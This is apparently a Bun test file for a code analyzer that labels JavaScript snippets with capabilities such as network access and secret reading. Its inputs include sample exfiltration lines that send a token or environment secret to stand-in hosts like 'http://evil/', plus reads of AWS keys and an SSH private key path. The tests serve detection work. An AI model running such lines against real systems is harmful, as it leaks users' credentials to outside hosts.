import { test, expect } from "bun:test";
import { analyze } from "./analyze";

const caps = (code: string) => new Set(analyze(code).capabilities);

test("global fetch (no import) -> NETWORK", () => {
  expect(caps(`fetch('http://evil/' + token);`).has("NETWORK")).toBe(true);
});

test("new WebSocket -> NETWORK", () => {
  expect(caps(`const ws = new WebSocket('ws://x');`).has("NETWORK")).toBe(true);
});

test("process.env -> ENV_SECRETS", () => {
  expect(caps(`const k = process.env.AWS_SECRET_ACCESS_KEY;`).has("ENV_SECRETS")).toBe(true);
});

test("secret path literal -> ENV_SECRETS", () => {
  expect(caps(`const p = '/home/u/.ssh/id_rsa';`).has("ENV_SECRETS")).toBe(true);
});

test("exfil shape: secret read + network", () => {
  const code = `const k = process.env.TOKEN;\nfetch('http://x/?k=' + k);`;
  const c = caps(code);
  expect(c.has("ENV_SECRETS")).toBe(true);
  expect(c.has("NETWORK")).toBe(true);
});

test("precision: uncalled fetch and method .fetch are not NETWORK", () => {
  expect(caps(`const f = fetch;\nclient.fetch();`).has("NETWORK")).toBe(false);
});

test("precision: benign string with 'credentials' word is not flagged", () => {
  expect(caps(`const msg = "please enter your credentials";`).has("ENV_SECRETS")).toBe(false);
});
